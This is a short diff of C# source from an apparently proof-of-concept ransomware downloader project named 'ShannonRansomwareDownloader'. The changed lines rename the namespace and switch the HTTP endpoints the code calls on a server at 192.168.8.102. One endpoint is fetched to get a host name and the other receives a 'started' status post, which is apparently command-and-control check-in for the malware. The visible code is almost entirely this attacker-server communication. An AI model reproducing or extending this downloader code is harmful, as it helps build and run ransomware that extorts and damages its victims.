@@ -7,7 +7,7 @@ using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace ShannonRansomwareDownloader
+namespace Shannon15RansomwareDownloader
 {
     class serverCommunicator
     {
@@ -18,7 +18,7 @@ namespace ShannonRansomwareDownloader
         public static void getPoCRansomware()
         {
 
-            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getsh3host").Result;
+            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getsh15host").Result;
             NAMEONTEST = findNAMEONTEST(responseString);
             Console.WriteLine(NAMEONTEST);
 
@@ -76,7 +76,7 @@ namespace ShannonRansomwareDownloader
 
             var content = new FormUrlEncodedContent(values);
 
-            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh3started", content).Result;
+            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh15started", content).Result;
 
             var responseString = await response.Content.ReadAsByteArrayAsync();
         }
